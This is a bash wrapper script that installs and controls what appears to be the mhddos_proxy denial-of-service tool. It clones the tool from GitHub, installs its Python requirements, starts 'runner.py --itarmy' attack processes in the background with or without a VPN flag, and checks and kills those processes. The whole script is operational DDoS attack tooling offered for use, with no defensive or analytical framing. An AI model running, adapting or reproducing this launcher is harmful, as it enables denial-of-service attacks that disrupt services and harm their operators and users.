#!/bin/bash


#checking for installation
#виконавча програма
EXEDir=mhddos_proxy
EXE=mhddos


############### functions ##################################

function statusAttackCommand {

    pgrep -f "vpnrunner_process_${EXE}" > /dev/null; echo $(($?==0));

}

function startAttackProxyCommand {

    cd $EXEDir;

    python3 runner.py --itarmy "vpnrunner_process_${EXE}"&

    cd ..;

}
 
function startAttackCommand {

    cd $EXEDir

    python3 runner.py --itarmy --vpn 0 "vpnrunner_process_${EXE}"&

    cd ..

}

function stopAttackCommand {

    echo "Stopping the processes:"
    pgrep -f "vpnrunner_process_${EXE}";

    pgrep -f "vpnrunner_process_${EXE}" | xargs pkill -TERM -P
    pgrep -f "vpnrunner_process_${EXE}" | xargs kill -9; sleep 2s;  \

}

#some statistics
function exeInfoCommand { echo ""; }

############################################################


############### init #######################################

function initEXECommand {

    if $forceExeReinstall ; then

        echo "Forcing exe reinstall -> will delete the folder $EXEDir"
        rm -f -r "$EXEDir"

    fi

    #download and install the EXE if not available
    if [ -d "$EXEDir" ] ; then

        echo "$EXEDir already exists -> nothing to do."
        echo ""

    else

        echo "Exe dir does not exist -> will create one by checking out from GIT..."
        echo ""

        git clone https://github.com/porthole-ascend-cinnamon/$EXEDir

        cd $EXEDir;

        python3 -m pip install -r requirements.txt

        cd ..;

        sleep 2s;

    fi

}

############################################################

